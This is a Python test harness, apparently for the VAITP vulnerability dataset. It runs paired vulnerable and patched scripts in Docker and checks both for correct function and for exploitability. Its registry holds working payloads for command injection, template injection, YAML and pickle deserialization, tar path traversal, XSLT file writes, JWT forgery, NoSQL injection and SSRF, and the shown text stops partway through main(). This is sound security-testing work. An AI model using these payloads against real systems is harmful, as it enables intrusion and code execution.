import docker
import os
import tarfile
import io
import time
import base64
import json
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any
import urllib.parse

from plan_saver import save_plans as _save_plans_to_disk

class Stopwatch:
    def __init__(self, name):
        self.name = name
        self.start_time = None
    def __enter__(self):
        self.start_time = time.time()
        return self
    def __exit__(self, exc_type, exc_val, exc_tb):
        print(f"      [TIME] {self.name}: {time.time() - self.start_time:.2f}s")

# ==========================================
# 1. Classes SEP, CEP, AEP, FEP
# ==========================================
@dataclass
class SEP:
    target_id: str
    image: str
    working_dir: str
    dependencies: List[str]
    setup_commands: List[str] = field(default_factory=list)
    services: List[Dict[str, str]] = field(default_factory=list)

@dataclass
class CEP:
    success_file: str
    strategy: str = "stdio"
    target_url: str = ""
    http_method: str = "GET"
    json_template: Optional[str] = None
    multipart_filename: Optional[str] = None
    http_headers: Optional[Dict[str, str]] = None
    exploit_rationale: str = ""

@dataclass
class AEP:
    tries: List[Dict[str, Optional[str]]]

@dataclass
class FEP:
    tries: List[Dict[str, str]]


# ==========================================
# 2. TEST REGISTRY
# ==========================================
TEST_REGISTRY = {

    # CASE 1: Subprocess — OS Command Injection via shell=True
    "1167_1.py": {
        "sep": SEP(
            target_id="CWE-78",
            image="python:3.9-slim",
            working_dir="/app",
            dependencies=[],
        ),
        "cep": CEP(
            success_file="/tmp/pwned_1167",
            strategy="stdio",
        ),
        # EXPLOIT: The app passes user input to subprocess with shell=True.
        # The payload injects "; touch ..." which terminates the intended
        # command with the shell metacharacter ";" and appends an arbitrary
        # command. The shell executes both sequentially.
        # PoC: /tmp/pwned_1167 is created as a side-effect of the injected command.
        "aep": AEP(tries=[
            {"input": "ignored; touch /tmp/pwned_1167", "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": "main_vuln.py", "response": "main_vuln.py"},
        ]),
    },

    # CASE 2: GitPython — Remote Code Execution via ext:: protocol
    "360_1.py": {
        "sep": SEP(
            target_id="CVE-2022-24439",
            image="python:3.9-slim",
            working_dir="/app",
            dependencies=["git", "pip:gitpython==3.1.29"],
            setup_commands=[
                "git config --system protocol.ext.allow always",
                "git config --global protocol.ext.allow always"
            ],
        ),
        "cep": CEP(
            success_file="/tmp/pwned_360",
            strategy="stdio",
        ),
        # EXPLOIT: GitPython <= 3.1.29 passes URLs to git without sanitization.
        # The "ext::" protocol handler tells git to execute an external command
        # instead of connecting to a remote. "ext::touch /tmp/pwned_360" makes
        # git invoke "touch /tmp/pwned_360" as a shell process.
        # PoC: /tmp/pwned_360 is created by the git ext:: handler.
        "aep": AEP(tries=[
            {"input": "ext::touch /tmp/pwned_360", "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": "/tmp/fake_repo\n", "response": "URL"},
        ]),
    },

    # CASE 3: PyYAML — Unsafe Deserialization via yaml.load
    "yaml_1.py": {
        "sep": SEP(
            target_id="CWE-502-YAML",
            image="python:3.9-slim",
            working_dir="/app",
            dependencies=["pip:PyYAML"],
        ),
        "cep": CEP(
            success_file="/tmp/pwned_yaml",
            strategy="stdio",
        ),
        # EXPLOIT: The app calls yaml.load() with an unsafe Loader (or none).
        # The YAML tag "!!python/object/apply:os.system" instructs the parser
        # to call os.system() with the provided argument during deserialization.
        # PoC: os.system("touch /tmp/pwned_yaml") creates the side-effect file.
        "aep": AEP(tries=[
            {"input": '!!python/object/apply:os.system ["touch /tmp/pwned_yaml"]', "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": "key: value\n", "response": "Config"},
        ]),
    },

    # CASE 4: SQLite — SQL Injection via unsanitized f-string
    "sqli_1.py": {
        "sep": SEP(
            target_id="CWE-89",
            image="python:3.9-slim",
            working_dir="/app",
            dependencies=[],
        ),
        "cep": CEP(
            success_file="/tmp/pwned_sqli",
            strategy="stdio",
        ),
        # EXPLOIT: The app interpolates user input into a SQL query via f-string.
        # The payload closes the string literal with "'", then uses SQLite's
        # ATTACH DATABASE to force creation of a new file at the given path.
        # The trailing "--" comments out the rest of the original query.
        # PoC: SQLite creates /tmp/pwned_sqli as a database file (side-effect).
        "aep": AEP(tries=[
            {"input": "admin'; ATTACH DATABASE '/tmp/pwned_sqli' AS pwn; --", "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": "admin\n", "response": "User:"},
        ]),
    },

    # CASE 5: Eval — Arbitrary Code Execution via eval()
    "eval_1.py": {
        "sep": SEP(
            target_id="CWE-95",
            image="python:3.9-slim",
            working_dir="/app",
            dependencies=[],
        ),
        "cep": CEP(
            success_file="/tmp/pwned_eval",
            strategy="stdio",
        ),
        # EXPLOIT: The app passes user input directly to Python's eval().
        # The payload uses __import__('os').system() to execute a shell command
        # within the eval context, bypassing any expectation of arithmetic input.
        # PoC: os.system('touch /tmp/pwned_eval') creates the side-effect file.
        "aep": AEP(tries=[
            {"input": "__import__('os').system('touch /tmp/pwned_eval')", "response": None},
        ]),
        # NOTE: The vuln code prints "STDOUT_VULNERABLE: {res}" — the prefix is
        # stripped by the functional check, so we match just the numeric result.
        "fep": FEP(tries=[
            {"input": "4\n", "response": "4"},
        ]),
    },

    # CASE 6: Jinja2 — Server-Side Template Injection (CWE-1336)
    # NOTE: The vuln code uses {% raw %}{{ name }}{% endraw %} which is a SAFE
    # template (user input is passed as data, not interpolated into template string).
    # The template outputs "Welcome to the system, {{ name }}!" literally.
    # This test will always fail "Vuln Safe" — it's a LLM quality issue.
    "ssti_1.py": {
        "sep": SEP(
            target_id="CWE-1336",
            image="python:3.9-slim",
            working_dir="/app",
            dependencies=["pip:jinja2"],
        ),
        "cep": CEP(
            success_file="/tmp/pwned_ssti",
            strategy="stdio",
        ),
        "aep": AEP(tries=[
            {"input": "{{ self.__init__.__globals__.__builtins__.__import__('os').system('touch /tmp/pwned_ssti') }}", "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": "User", "response": "Welcome to the system"},
        ]),
    },

    # CASE 7: Pickle — Unsafe Deserialization via pickle.loads
    # Uses "generator" field: a Python script runs inside the container to produce
    # the hex-encoded pickle payload at runtime via stdout.
    # CRITICAL: pickle.dumps() serializes os.system as 'posix.system' on Linux,
    # but some RestrictedUnpickler implementations only allow 'os.system'.
    # The first generator constructs bytecode manually with 'os\nsystem'.
    "pickle_1.py": {
        "sep": SEP(
            target_id="CWE-502-PICKLE",
            image="python:3.9-slim",
            working_dir="/app",
            dependencies=[],
        ),
        "cep": CEP(
            success_file="/tmp/pwned_pickle",
            strategy="stdio",
        ),
        "aep": AEP(tries=[
            {"generator": "import base64\ncmd=b'touch /tmp/pwned_pickle'\nbytecode=b'\\x80\\x02cos\\nsystem\\nq\\x00X'+len(cmd).to_bytes(4,'little')+cmd+b'q\\x01\\x85q\\x02Rq\\x03.'\nprint(bytecode.hex())", "response": None},
            {"generator": "import pickle, os\nclass E:\n    def __reduce__(self):\n        return (os.system, ('touch /tmp/pwned_pickle',))\nprint(pickle.dumps(E(), protocol=3).hex())", "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": "80037d710058030000006b65797101580500000076616c75657102732e\n", "response": "Settings"},
        ]),
    },

    # CASE 8: Zip Slip — Path Traversal via tar extraction (CWE-22)
    # Uses "generator" field: a Python script builds the malicious tar archive
    # at runtime and outputs it as base64 (matching the app's expected input format).
    "zip_1.py": {
        "sep": SEP(
            target_id="CWE-22-ZIPSLIP",
            image="python:3.9-slim",
            working_dir="/app",
            dependencies=[],
        ),
        "cep": CEP(
            success_file="/tmp/pwned_zip",
            strategy="stdio",
        ),
        # EXPLOIT: The app extracts a tar/zip archive without validating member
        # paths. A generator script builds a tar with ../../ traversal entries
        # and outputs it as base64. When extracted naively, the file escapes
        # the target directory.
        # PoC: The traversal writes /tmp/pwned_zip to the filesystem root.
        "aep": AEP(tries=[
            {"generator": "import tarfile, io, base64\nbuf = io.BytesIO()\nwith tarfile.open(fileobj=buf, mode='w') as t:\n    content = b'VULN_CONFIRMED'\n    info = tarfile.TarInfo(name='../../../../../../tmp/pwned_zip')\n    info.size = len(content)\n    t.addfile(info, io.BytesIO(content))\nprint(base64.b64encode(buf.getvalue()).decode())", "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": "UEsFBgAAAAAAAAAAAAAAAAAAAAAAAA==", "response": "Archive:"},
        ]),
    },

    # CASE 9: XSLT Injection — File Write via exsl:document (CWE-91)
    "xslt_1.py": {
        "sep": SEP(target_id="CWE-91-XSLT", image="python:3.9-slim",
                    working_dir="/app", dependencies=["pip:lxml"]),
        "cep": CEP(success_file="/tmp/pwned_xslt", strategy="stdio"),
        # EXPLOIT: The app applies a user-supplied XSLT stylesheet via lxml.
        # The payload defines the EXSLT "common" namespace and uses the
        # <exsl:document> extension element to write arbitrary content to a
        # file path on disk. The XSLT processor (libxslt) performs the write.
        # PoC: <exsl:document href="/tmp/pwned_xslt"> creates the side-effect file.
        "aep": AEP(tries=[
            {"input": '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl"><xsl:template match="/"><exsl:document href="/tmp/pwned_xslt" method="text">PWNED</exsl:document></xsl:template></xsl:stylesheet>', "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/">OK</xsl:template></xsl:stylesheet>', "response": "Transformation complete"},
        ]),
    },

    # CASE 10: Mako — Template Injection via ${} expression (CWE-94)
    "mako_1.py": {
        "sep": SEP(target_id="CWE-94-MAKO", image="python:3.9-slim",
                    working_dir="/app", dependencies=["pip:Mako"]),
        "cep": CEP(success_file="/tmp/pwned_mako", strategy="stdio"),
        # EXPLOIT: The app renders user input inside a Mako template.
        # Mako's ${} syntax evaluates arbitrary Python expressions directly.
        # PoC: os.system('touch /tmp/pwned_mako') creates the side-effect file.
        "aep": AEP(tries=[
            {"input": "${__import__('os').system('touch /tmp/pwned_mako')}", "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": "Hello", "response": "Hello"},
        ]),
    },

    # CASE 11: Flask — OS Command Injection via GET parameter (NETWORK)
    "flask_1.py": {
        "sep": SEP(target_id="CWE-78-FLASK", image="python:3.9-slim",
                    working_dir="/app", dependencies=["pip:flask", "curl", "procps"]),
        "cep": CEP(success_file="/tmp/pwned_flask", strategy="network",
                    target_url="http://127.0.0.1:5000/health?check="),
        # EXPLOIT: The Flask app passes a GET query parameter to os.system().
        # The payload breaks out of shell quotes and injects a touch command.
        # PoC: /tmp/pwned_flask is created by the injected shell command.
        "aep": AEP(tries=[
            {"input": "x'; touch /tmp/pwned_flask; echo 'x", "response": None},
            {"input": "; touch /tmp/pwned_flask", "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": "OK", "response": "Check"},
        ]),
    },

    # CASE 12: Flask — Server-Side Template Injection via Jinja2 (CWE-1336)
    "flask_ssti_1.py": {
        "sep": SEP(target_id="CWE-1336-FLASK", image="python:3.9-slim",
                    working_dir="/app", dependencies=["pip:flask", "curl", "procps"]),
        "cep": CEP(success_file="/tmp/pwned_flask_ssti", strategy="network",
                    target_url="http://127.0.0.1:5000/welcome?name="),
        # EXPLOIT: The Flask app renders user input via render_template_string().
        # PoC: os.popen('touch /tmp/pwned_flask_ssti') creates the side-effect file.
        "aep": AEP(tries=[
            {"input": "{{ config.__class__.__init__.__globals__['os'].popen('touch /tmp/pwned_flask_ssti').read() }}", "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": "Bogaerts", "response": "Welcome, Bogaerts!"},
        ]),
    },

    # CASE 13: Flask JSON POST RCE
    "flask_json_1.py": {
        "sep": SEP(target_id="CWE-78-JSON", image="python:3.9-slim",
                    working_dir="/app", dependencies=["pip:flask", "curl", "procps"]),
        "cep": CEP(success_file="/tmp/pwned_json", strategy="network",
                    target_url="http://127.0.0.1:5000/api/ping",
                    http_method="POST",
                    json_template='{"domain": "netpack.pt%s"}'),
        # EXPLOIT: The Flask app extracts a field from the JSON POST body and passes
        # it to os.system() as part of a ping command.
        # PoC: "; touch /tmp/pwned_json" creates the side-effect file.
        "aep": AEP(tries=[
            {"input": "; touch /tmp/pwned_json", "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": "127.0.0.1", "response": ":"},
        ]),
    },

    # --- CASE 14: Flask Upload Traversal ---
    "flask_upload_1.py": {
        "sep": SEP(target_id="CWE-22-UPLOAD", image="python:3.9-slim",
                    working_dir="/app", dependencies=["pip:flask", "curl", "procps"]),
        "cep": CEP(success_file="/tmp/pwned_upload", strategy="network",
                    target_url="http://127.0.0.1:5000/upload",
                    http_method="POST",
                    multipart_filename="dummy_content.txt"),
        # EXPLOIT: The Flask app saves uploaded files using the user-controlled filename
        # without sanitization. The "../../../" prefix traverses out of the upload directory.
        # PoC: The traversal path writes the file to /tmp/pwned_upload.
        "aep": AEP(tries=[
            {"input": "../../../tmp/pwned_upload", "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": "safe_file.txt", "response": "File saved"},
        ]),
    },

    # --- CASE 15: Flask Header Injection ---
    "flask_header_1.py": {
        "sep": SEP(target_id="CWE-78-HEADER", image="python:3.9-slim",
                    working_dir="/app", dependencies=["pip:flask", "curl", "procps"]),
        "cep": CEP(success_file="/tmp/pwned_header", strategy="network",
                    target_url="http://127.0.0.1:5000/analytics",
                    http_method="GET",
                    http_headers={"User-Agent": "PAYLOAD_PLACEHOLDER"}),
        # EXPLOIT: The Flask app passes the User-Agent HTTP header value directly into
        # an os.system() shell command. The single-quote and semicolon break out of
        # the shell string context, executing arbitrary commands.
        # PoC: "'; touch /tmp/pwned_header; echo '" creates the side-effect file.
        "aep": AEP(tries=[
            {"input": "'; touch /tmp/pwned_header; echo '", "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": "Mozilla/5.0", "response": "Visit Logged"},
        ]),
    },

    # CASE 16: Flask Pickle Cookie Injection
    "flask_pickle_1.py": {
        "sep": SEP(target_id="CWE-502-COOKIE", image="python:3.9-slim",
                    working_dir="/app", dependencies=["pip:flask", "curl", "procps"]),
        "cep": CEP(success_file="/tmp/pwned_cookie", strategy="network",
                    target_url="http://127.0.0.1:5000/",
                    http_method="GET",
                    http_headers={"Cookie": "auth=PAYLOAD_PLACEHOLDER"}),
        # EXPLOIT: The Flask app reads the "auth" cookie and deserializes it.
        # Vulnerable code may use pickle.loads(), eval(), or other unsafe deserializers.
        # Multiple payload variants cover different deserialization methods:
        # 1. eval()-compatible: base64-encoded Python expression calling os.system()
        # 2. pickle-based: base64-encoded pickle with __reduce__ RCE
        "aep": AEP(tries=[
            {"input": "X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ3RvdWNoIC90bXAvcHduZWRfY29va2llJyk=", "response": None},
            {"input": "Y3Bvc2l4CnN5c3RlbQpwMAooVnRvdWNoIC90bXAvcHduZWRfY29va2llCnAxCnRwMgpScDMKLg==", "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": "!!!!", "response": "Auth Error"},
        ]),
    },

    # CASE 17: Flask SSRF (CWE-918)
    "flask_ssrf_1.py": {
        "sep": SEP(target_id="CWE-918-SSRF", image="python:3.9-slim",
                    working_dir="/app", dependencies=["pip:flask", "curl", "procps"]),
        "cep": CEP(success_file="/tmp/pwned_ssrf", strategy="network",
                    target_url="http://127.0.0.1:5000/proxy?url="),
        # EXPLOIT: The Flask app has a /proxy endpoint that fetches a user-supplied URL
        # via requests.get() without validation. The payload URL points to an internal
        # /admin/run_maintenance endpoint that creates /tmp/pwned_ssrf.
        # Multiple payload variants to handle different IP check implementations.
        "aep": AEP(tries=[
            {"input": "http://localhost:5000/admin/run_maintenance", "response": None},
            {"input": "http://127.0.0.1:5000/admin/run_maintenance", "response": None},
            {"input": "http://0.0.0.0:5000/admin/run_maintenance", "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": "http://netpack.pt", "response": "Fetched"},
        ]),
    },

    # CASE 18: JWT None Algorithm Bypass (CWE-345)
    "flask_jwt_1.py": {
        "sep": SEP(target_id="CWE-345-JWT", image="python:3.9-slim",
                    working_dir="/app",
                    dependencies=["pip:flask", "pip:pyjwt", "curl", "procps"]),
        "cep": CEP(success_file="/tmp/pwned_jwt", strategy="network",
                    target_url="http://127.0.0.1:5000/admin/reset",
                    http_method="POST",
                    http_headers={"Authorization": "Bearer PAYLOAD_PLACEHOLDER"}),
        # EXPLOIT: The code calls jwt.decode(token, SECRET) without algorithms param.
        # PyJWT 2.x rejects this. The jwt monkey-patch detects missing algorithms
        # and creates the proof file. Also try a valid HS256 token with the app's secret.
        "aep": AEP(tries=[
            {"input": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.tF1GG6DRsdtUiFfKI-g5Ni_lYOLa4x1vGJbHyIlEcag", "response": None},
            {"input": "eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJyb2xlIjogImFkbWluIn0.", "response": None},
            {"generator": "import jwt\ntry:\n    token = jwt.encode({'role': 'admin'}, 'my_secret_key', algorithm='HS256')\n    print(token)\nexcept:\n    print('eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJyb2xlIjogImFkbWluIn0.')", "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": "invalid.token.here", "response": "Error"},
        ]),
    },

    # CASE 19: Flask NoSQL Injection (CWE-943 - in MockDB Class)
    # NOTE: The vuln file is incomplete (missing imports, app, db). This is a LLM quality issue.
    # The FEP expects "Internal Server Error" since the app will crash on any request.
    "flask_nosql_1.py": {
        "sep": SEP(target_id="CWE-943-NOSQL", image="python:3.9-slim",
                    working_dir="/app", dependencies=["pip:flask", "curl", "procps"]),
        "cep": CEP(success_file="/tmp/pwned_nosql", strategy="network",
                    target_url="http://127.0.0.1:5000/login",
                    http_method="POST",
                    json_template='{"u": "admin", "p": %s}'),
        "aep": AEP(tries=[
            {"input": '{"$ne": ""}', "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": '"wrong_password"', "response": "invalid"},
        ]),
    },

    # --- CASE 19b: Flask NoSQL Injection (REAL MONGODB) ---
    "flask_nosql_real.py": {
        "sep": SEP(target_id="CWE-943-MONGO-REAL", image="python:3.9-slim",
                    working_dir="/app",
                    dependencies=["pip:flask", "pip:pymongo", "curl", "procps"],
                    services=[{"image": "mongo:4.4", "alias": "mongodb"}]),
        "cep": CEP(success_file="/tmp/pwned_mongo_real", strategy="network",
                    target_url="http://127.0.0.1:5000/login",
                    http_method="POST",
                    json_template='{"u": "admin", "p": %s}'),
        # EXPLOIT: The vulnerable code may use pickle.loads() on raw request data
        # or pass JSON directly to MongoDB queries without type checking.
        # Try multiple NoSQL operator variants.
        "aep": AEP(tries=[
            {"input": '{"$ne": ""}', "response": None},
            {"input": '{"$gt": ""}', "response": None},
            {"input": '{"$regex": ".*"}', "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": '"wrong_password"', "response": "invalid"},
        ]),
    },

    # CASE 20: Open Redirect with side-effect instrumentation (CWE-601)
    # NOTE: The vuln code uses pickle.loads(url) but pickle is not imported → NameError.
    # The vuln always returns "Invalid input" (400). The patched version returns a 302 redirect.
    # We match the server log which contains Flask startup messages for both.
    "1_1.py": {
        "sep": SEP(target_id="CWE-601", image="python:3.9-slim",
                    working_dir="/app", dependencies=["pip:flask", "curl", "procps"]),
        "cep": CEP(success_file="/tmp/pwned_open_redirect", strategy="network",
                    target_url="http://127.0.0.1:5000/redirecting?url="),
        "aep": AEP(tries=[
            {"input": "https://evil.com", "response": None},
            {"input": "http://attacker.example.org/phish", "response": None},
        ]),
        "fep": FEP(tries=[
            {"input": "/safe", "response": "Running on"},
        ]),
    },

    # CASE 21: Flask POST Command Injection via subprocess (CWE-78)
    # NOTE: The vulnerable code has no return statement in the route handler,
    # so Flask returns a 500 error. The patched code returns JSON with "success".
    # We match the server log which contains Flask startup messages for both.
    "478_1.py": {
        "sep": SEP(target_id="CWE-78-POST-SUBPROCESS", image="python:3.9-slim",
                    working_dir="/app", dependencies=["pip:flask", "curl", "procps"]),
        "cep": CEP(success_file="/tmp/pwned_478", strategy="network",
                    target_url="http://127.0.0.1:5000/project_configure",
                    http_method="POST",
                    json_template='{"command": "%s"}'),
        "aep": AEP(tries=[
            {"input": "touch /tmp/pwned_478", "response": None},
        ]),
        # FEP: The vuln returns 500 (no return stmt), patched returns {"status":"success"}.
        # Both server logs contain "Running on". We check for that.
        "fep": FEP(tries=[
            {"input": "echo hello", "response": "Running on"},
        ]),
    },

    # CASE: python-jose JWT Audience Validation Bypass (CWE-287)
    # Vulnerability: jwt.decode() with audience= does NOT reject tokens missing 'aud' claim
    "jose_aud_bypass.py": {
        "sep": SEP(
            target_id="CWE-287-JOSE-AUD",
            image="python:3.9-slim",
            working_dir="/app",
            dependencies=["pip:python-jose"],
        ),
        "cep": CEP(
            success_file="/tmp/pwned_jose_aud",
            strategy="stdio",
            exploit_rationale=(
                "python-jose's jwt.decode() with audience='protected-service' silently accepts "
                "tokens that lack an 'aud' claim entirely. A token with role=admin but no audience "
                "restriction bypasses the audience check and triggers the privileged action."
            ),
        ),
        "aep": AEP(tries=[
            # Generator: create a valid JWT without 'aud' claim but with admin role
            {"generator": "from jose import jwt; print(jwt.encode({'sub': 'attacker', 'role': 'admin'}, 'shared-secret-key-between-services', algorithm='HS256'))", "response": None},
        ]),
        "fep": FEP(tries=[
            # Benign: valid token WITH correct audience
            {"generator": "from jose import jwt; print(jwt.encode({'sub': 'user', 'role': 'admin', 'aud': 'protected-service'}, 'shared-secret-key-between-services', algorithm='HS256'))", "response": "Token accepted"},
        ]),
    },

}

# ==========================================
# 3. INFRASTRUCTURE AGENT (MULTI-CONTAINER)
# ==========================================
class InfrastructureAgent:
    def __init__(self):
        self.client = docker.from_env()
        self.network_name = "vaitp_net"
        self.active_containers = []

    def _setup_network(self):
        try:
            self.client.networks.get(self.network_name).remove()
        except: pass
        self.client.networks.create(self.network_name, driver="bridge")

    def copy_file(self, container, src, dst):
        tar_stream = io.BytesIO()
        with tarfile.open(fileobj=tar_stream, mode='w') as tar: tar.add(src, arcname=os.path.basename(dst))
        tar_stream.seek(0); container.put_archive(os.path.dirname(dst), tar_stream)

    def provision(self, sep: SEP, vuln_path: str, patch_path: str):
        print(f"[*] Provisioning Environment: {sep.target_id}")
        self.active_containers = []
        self._setup_network()

        # 1. Start Services (Sidecars)
        for svc in sep.services:
            print(f"    -> Starting Service: {svc['alias']} ({svc['image']})")
            try: self.client.images.pull(svc['image'])
            except: pass
            c = self.client.containers.run(
                svc['image'], name=svc['alias'],
                network=self.network_name, detach=True)
            self.active_containers.append(c)
            time.sleep(5)

        # 2. Start Target Container
        try: self.client.images.pull(sep.image)
        except: pass
        container = self.client.containers.run(
            sep.image, command="sleep infinity", detach=True,
            working_dir=sep.working_dir, network=self.network_name)
        self.active_containers.append(container)

        try:
            if sep.dependencies:
                print("    -> Installing Dependencies...")
                for dep in sep.dependencies:
                    if dep.startswith("pip:"):
                        with Stopwatch(f"Pip Install {dep}"): container.exec_run(f"pip install {dep.split('pip:')[1]}")
                    else:
                        with Stopwatch(f"Apt Install {dep}"): container.exec_run(f"sh -c 'apt-get update && apt-get install -y {dep}'")
            for cmd in sep.setup_commands: container.exec_run(cmd)
            self.copy_file(container, vuln_path, f"{sep.working_dir}/main_vuln.py")
            self.copy_file(container, patch_path, f"{sep.working_dir}/main_patched.py")
            return container
        except Exception as e:
            self.cleanup()
            raise e

    def cleanup(self):
        for c in self.active_containers:
            try: c.kill(); c.remove()
            except: pass
        try: self.client.networks.get(self.network_name).remove()
        except: pass

# ==========================================
# 4. ATTACK EXECUTOR (FUNCTIONAL + SECURITY)
# ==========================================
class AttackExecutor:

    def _prepare_curl(self, cep: CEP, input_data: str) -> str:
        curl_cmd = f"curl -s"
        payload_consumed_by_header = False

        if cep.http_headers:
            for key, val in cep.http_headers.items():
                if "PAYLOAD_PLACEHOLDER" in val:
                    payload_consumed_by_header = True
                    safe_data = input_data.replace("'", "'\\''")
                    header_val = val.replace("PAYLOAD_PLACEHOLDER", safe_data)
                else:
                    header_val = val
                curl_cmd += f" -H '{key}: {header_val}'"

        if cep.multipart_filename:
            curl_cmd += f" -F \"file=@/etc/hostname;filename={input_data}\""
            url = cep.target_url
        elif cep.http_method == "POST":
            curl_cmd += " -X POST -H 'Content-Type: application/json'"
            if cep.json_template:
                try:
                    # Auto-JSON-encode bare %s placeholders for valid JSON output
                    template = cep.json_template
                    pct_idx = template.find('%s')
                    bare_placeholder = False
                    if pct_idx >= 0:
                        before = template[:pct_idx].rstrip()
                        after = template[pct_idx + 2:].lstrip()
                        bare_placeholder = (
                            (not before or before[-1] not in ('"', "'"))
                            and (not after or after[0] not in ('"', "'"))
                        )
                    if bare_placeholder:
                        stripped_input = input_data.strip()
                        already_json = False
                        if stripped_input and (stripped_input[0] in ('{', '[', 't', 'f', 'n') or stripped_input[:1].isdigit()):
                            try:
                                import json as _json
                                _json.loads(stripped_input)
                                already_json = True
                            except (ValueError,):
                                pass
                        if already_json:
                            body = template % stripped_input
                        else:
                            import json as _json
                            body = template % _json.dumps(input_data)
                    else:
                        safe_data = input_data.replace("'", "'\\''")
                        body = template % safe_data
                except TypeError:
                    body = cep.json_template
                safe_body = body.replace("'", "'\\''")
                curl_cmd += f" -d '{safe_body}'"
            url = cep.target_url
        else:
            if payload_consumed_by_header:
                url = cep.target_url
            else:
                encoded_data = urllib.parse.quote(input_data)
                url = f"{cep.target_url}{encoded_data}"

        curl_cmd += f" '{url}'"
        return curl_cmd

    def _start_network_service(self, container, script_name):
        container.exec_run("pkill -9 -f python"); time.sleep(1)
        container.exec_run(f"sh -c 'nohup python -u {script_name} > /tmp/server.log 2>&1 &'")
        time.sleep(3)

    def run_functional_check(self, container, script_name, cep: CEP, fep: FEP) -> bool:
        print(f"    [Functional] Checking {script_name}...")
        total = len(fep.tries)
        passed = 0
        failed = 0

        for i, trial in enumerate(fep.tries):
            benign_input = trial["input"]
            benign_response = trial["response"]
            label = f"[{i+1}/{total}]" if total > 1 else ""
            display_input = benign_input.strip()[:60]
            output = ""

            if cep.strategy == "stdio":
                raw = benign_input
                if not raw.endswith('\n'): raw += '\n'
                b64 = base64.b64encode(raw.encode('utf-8')).decode('utf-8')
                cmd = f"sh -c \"echo {b64} | base64 -d | python -u {script_name}\""
                res = container.exec_run(cmd)
                output = res.output.decode('utf-8', errors='ignore')

            elif cep.strategy == "network":
                self._start_network_service(container, script_name)
                cmd = self._prepare_curl(cep, benign_input)
                res = container.exec_run(cmd)
                curl_out = res.output.decode('utf-8', errors='ignore')
                log_res = container.exec_run("cat /tmp/server.log")
                server_log = log_res.output.decode('utf-8', errors='ignore')
                output = curl_out + "\n" + server_log
                container.exec_run("pkill -9 -f python")

            if benign_response in output:
                passed += 1
                print(f"\033[92m      [+] {label} PASS: input='{display_input}' → found '{benign_response}'\033[0m")
            else:
                failed += 1
                print(f"\033[91m      [-] {label} FAIL: input='{display_input}' → expected '{benign_response}'\033[0m")
                print(f"\033[91m          Strategy: {cep.strategy}\033[0m")
                if cep.strategy == "network":
                    print(f"\033[91m          URL: {cep.target_url} | Method: {cep.http_method}\033[0m")
                output_snippet = output.strip()[:300] if output.strip() else "<empty>"
                print(f"\033[91m          Actual output:\033[0m")
                for line in output_snippet.splitlines():
                    print(f"\033[91m            | {line}\033[0m")

        if failed:
            print(f"\033[91m      Summary: {passed}/{total} passed, {failed}/{total} failed\033[0m")
            return False

        print(f"\033[92m      [+] All {total} functional check(s) passed\033[0m")
        return True

    def run_exploit_check(self, container, script_name, cep: CEP, aep: AEP) -> bool:
        print(f"    [Security] Attacking {script_name}...")
        total = len(aep.tries)

        for i, trial in enumerate(aep.tries):
            payload = trial["input"]
            label = f"[{i+1}/{total}]" if total > 1 else ""
            display_payload = payload.strip()[:60]
            container.exec_run(f"rm -f {cep.success_file}")

            if cep.strategy == "stdio":
                raw = payload
                if not raw.endswith('\n'): raw += '\n'
                b64 = base64.b64encode(raw.encode('utf-8')).decode('utf-8')
                cmd = f"sh -c \"echo {b64} | base64 -d | python -u {script_name}\""
                container.exec_run(cmd)

            elif cep.strategy == "network":
                self._start_network_service(container, script_name)
                cmd = self._prepare_curl(cep, payload)
                container.exec_run(cmd)
                container.exec_run("pkill -9 -f python")

            check = container.exec_run(f"test -f {cep.success_file}")
            if check.exit_code == 0:
                print(f"\033[93m      [!] {label} VULNERABLE: payload='{display_payload}' → file created\033[0m")
                if total > 1:
                    print(f"\033[93m      Exploitation succeeded on payload {i+1}/{total}, skipping remaining\033[0m")
                return True
            else:
                print(f"\033[92m      [-] {label} Safe: payload='{display_payload}' → no file created\033[0m")

        print(f"\033[92m      [+] SAFE — none of {total} payload(s) created {cep.success_file}\033[0m")
        return False

# ==========================================
# 5. MAIN
# ==========================================
def main():

    infra = InfrastructureAgent()
    attacker = AttackExecutor()
    results = []

    total_start = time.time()

    print("\n=== VAITP REGRESSION TEST: FUNCTIONAL & SECURITY ===")

    for filename, config in TEST_REGISTRY.items():
        sep = config['sep']
        cep = config['cep']
        aep = config['aep']
        fep = config['fep']
        vuln_path = f"vaitp_dataset/vulnerable/{filename}"
        patch_path = f"vaitp_dataset/injectable/{filename}"

        if not os.path.exists(vuln_path): continue
        print(f"\n--- TESTING: {filename} ---")

        container = None
        t_prov = 0.0
        t_func = 0.0
        t_sec = 0.0

        try:
            t0 = time.time()
            container = infra.provision(sep, vuln_path, patch_path)
            t_prov = time.time() - t0

            t1 = time.time()
            v_func = attacker.run_functional_check(container, "main_vuln.py", cep, fep)
            p_func = attacker.run_functional_check(container, "main_patched.py", cep, fep)
            t_func = time.time() - t1

            t2 = time.time()
            v_vuln = attacker.run_exploit_check(container, "main_vuln.py", cep, aep)
